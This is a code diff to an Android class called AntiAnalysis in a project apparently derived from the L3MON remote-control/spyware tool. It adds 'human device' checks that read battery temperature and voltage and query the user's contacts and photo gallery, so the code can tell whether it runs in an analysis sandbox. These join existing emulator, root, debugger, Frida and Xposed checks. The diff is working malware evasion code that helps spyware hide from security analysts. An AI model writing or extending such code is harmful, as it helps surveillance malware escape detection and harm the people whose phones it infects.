@@ -3,8 +3,15 @@ package com.etechd.l3mon;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.content.pm.Signature;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.database.Cursor;
+import android.net.Uri;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Debug;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.util.Log;
 
 import java.io.BufferedReader;
@@ -39,7 +46,75 @@ public class AntiAnalysis {
 
     public static boolean isSafeEnvironment() {
         return !isEmulator() && !isRooted() && !isDebuggerAttached() &&
-                !isFridaDetected() && !isXposedDetected() && !isRunningInSandbox();
+                !isFridaDetected() && !isXposedDetected() && !isRunningInSandbox() &&
+                isHumanDevice();
+    }
+
+    /**
+     * Verificações de "Humanidade" para detectar sandboxes físicas reais.
+     */
+    public static boolean isHumanDevice() {
+        return checkBatteryHealth() && hasUserMetadata();
+    }
+
+    private static boolean checkBatteryHealth() {
+        try {
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryStatus = context.registerReceiver(null, ifilter);
+            if (batteryStatus == null) return true;
+
+            // 1. Nível de Bateria estático (Sandboxes costumam fixar em 50% ou 100%)
+            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+            float batteryPct = level * 100 / (float)scale;
+
+            if (batteryPct == 50.0f || batteryPct == 100.0f || batteryPct == 0.0f) {
+                // Suspeito, mas não conclusivo sozinho
+            }
+
+            // 2. Temperatura da Bateria (0 ou valor fixo em sandboxes)
+            int temp = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
+            if (temp <= 0) {
+                Log.w(TAG, "Battery temperature unusual: " + temp);
+                return false; // Sensores reais raramente retornam <= 0
+            }
+
+            // 3. Voltagem (0 em muitas sandboxes)
+            int voltage = batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);
+            if (voltage == 0) return false;
+
+            return true;
+        } catch (Exception e) {
+            return true; 
+        }
+    }
+
+    private static boolean hasUserMetadata() {
+        if (context == null) return true;
+        try {
+            // 1. Verifica se há contatos reais (Sandboxes são limpas)
+            Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, 
+                    null, null, null, null);
+            int contactCount = (cursor != null) ? cursor.getCount() : 0;
+            if (cursor != null) cursor.close();
+
+            // 2. Verifica se há fotos na galeria
+            Cursor imageCursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    null, null, null, null);
+            int imageCount = (imageCursor != null) ? imageCursor.getCount() : 0;
+            if (imageCursor != null) imageCursor.close();
+
+            // Dispositivos reais costumam ter pelo menos alguns contatos ou fotos
+            if (contactCount == 0 && imageCount == 0) {
+                Log.w(TAG, "No user metadata found (Contacts/Images)");
+                return false;
+            }
+
+            return true;
+        } catch (Exception e) {
+            // Se não houver permissão ainda, assumimos que é humano para não travar o início
+            return true;
+        }
     }
 
     // ==================== EMULADOR / VM ====================
@@ -193,7 +268,11 @@ public class AntiAnalysis {
 
     // ==================== UTILS ====================
     public static boolean isDebuggerAttached() {
-        return Debug.isDebuggerConnected();
+        boolean connected = Debug.isDebuggerConnected();
+        if (connected) {
+            com.etechd.l3mon.managers.LogManager.logSecurityEvent("Debugger connected");
+        }
+        return connected;
     }
 
     private static String getSystemProperty(String propName) {
